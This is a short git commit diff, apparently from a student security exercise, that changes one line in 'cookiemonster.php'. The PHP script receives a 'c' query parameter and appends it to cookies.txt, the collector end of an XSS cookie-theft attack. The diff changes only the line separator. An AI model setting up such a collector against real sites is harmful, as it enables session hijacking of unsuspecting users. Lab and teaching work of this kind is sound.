ff56666d9c341ee0f5e803485bf8a219b0d96027
cjdinsmore <caleb_dinsmore@taylor.edu>
2015-11-17 22:40:42 -0500

    Committing to update server - 1.1&1.2&1.4&1.5 Complete--RSA TEST

--- PART-2-PHP-SCRIPT/cookiemonster.php
+++ PART-2-PHP-SCRIPT/cookiemonster.php
@@ -1,6 +1,6 @@
 <?php
   if (isset($_GET['c'])) {
-    file_put_contents("cookies.txt", $_GET['c']."\n", FILE_APPEND);
+    file_put_contents("cookies.txt", $_GET['c']."<br/>", FILE_APPEND);
   }
 
   $file = fopen("cookies.txt", "r");
